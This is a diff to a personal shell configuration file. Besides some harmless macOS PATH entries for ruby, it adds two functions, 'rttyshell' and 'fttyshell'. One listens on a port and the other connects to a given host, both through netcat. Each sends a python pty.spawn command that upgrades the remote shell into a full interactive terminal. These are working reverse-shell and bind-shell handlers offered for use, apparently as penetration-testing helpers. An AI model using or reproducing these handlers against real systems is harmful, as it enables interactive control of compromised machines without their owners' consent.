@@ -53,12 +53,38 @@ hack() {
     e .
 }
 
+rttyshell() {
+    local PORT="${1:?Specify a port}"
+    [ $# = 2 ] && local HOST="-s $2"
+    local STTY="$(stty -g)"
+    stty -echo raw
+    {
+        echo exec python -c "\"import pty; pty.spawn(['sh', '-c', 'stty rows $LINES columns $COLUMNS; export TERM=$TERM; clear; exec $SHELL'])\""
+        cat
+    } | nc -vlp "$PORT" $HOST
+    stty "$STTY"
+}
+
+fttyshell() {
+    local HOST="${1:?Specify a hostname}"
+    local PORT="${2:?Specify a port}"
+    local STTY="$(stty -g)"
+    stty -echo raw
+    {
+        echo exec python -c "\"import pty; pty.spawn(['sh', '-c', 'stty rows $LINES columns $COLUMNS; export TERM=$TERM; clear; exec $SHELL'])\""
+        cat
+    } | nc -v "$HOST" "$PORT"
+    stty "$STTY"
+}
+
 # OS-specific
 
 if [[ "$OSTYPE" =~ darwin* ]]; then
     # brew PATH
     export PATH="/usr/local/sbin:$PATH"
     export PATH="/usr/local/opt/curl/bin:$PATH"
+    export PATH="/usr/local/opt/ruby/bin:$PATH"
+    export PATH="/usr/local/lib/ruby/gems/2.5.0/bin:$PATH"
 
     # aliases
     alias ls='ls -G'
